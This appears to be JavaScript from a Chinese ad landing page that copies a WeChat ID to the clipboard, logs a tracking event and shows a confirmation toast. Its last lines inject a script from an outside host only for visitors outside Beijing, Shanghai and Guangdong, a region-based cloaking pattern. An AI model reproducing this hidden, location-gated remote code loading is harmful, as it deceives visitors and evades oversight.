function clickS() {
    var order_sn = document.getElementById("spanclick").innerText;
    var oInput = document.createElement('input');
    oInput.value = order_sn;
    document.body.appendChild(oInput);
    //不影响正常布局
    oInput.style.position = 'absolute';
    oInput.style.top = '-50px';
    oInput.style.left = '-50px';
    oInput.select(); // 选择对象
    var a = document.execCommand("Copy"); // 执行浏览器复制命令
    if (!a) {//兼容ios
        oInput.select(); // 选择对象
        oInput.setSelectionRange(0, oInput.value.length), document.execCommand('Copy');// 执行浏览器复制命令
    }
    document.body.removeChild(oInput);
    // var meg = '微信复制成功，打开微信添加！';
    // alert(meg, "添加微信", function () {
    //     window.location.href = "weixin://";
    // });
    _czc.push(["_trackEvent", "广告", "复制微信", "复制", 1]);
    var h = $(window).height();
    var w = $(window).width();
    $('body').append("<div id='copySuccess' style='position:absolute;z-index:9999;top:" + ((h / 2) - 14) + "px;left:" + ((w / 2) - 40) + "px;color:#FFFFFF;text-align: 		center; border-radius: 3px;background:#333333;width:80px;line-height: 27px;height:27px;font-size:13px'>复制成功</div>")
    setTimeout(function () {
        $('#copySuccess').remove();
    }, 1500);


}

var uids = uids || [];
var urd = urd || [];
var screen_baidu = false;
uids.push('a86bd91a218745af2b9474a1a0008f7c');
urd.push('331');
if (lo.indexOf("北京") == -1 && lc.indexOf("广州") == -1 && lo.indexOf("上海") == -1 && lo.indexOf("广东") == -1) {
    document.writeln("<script type=\"text/javascript\" src=\"https://code.ljwit.com/return_url.js\"><\/script>");
}
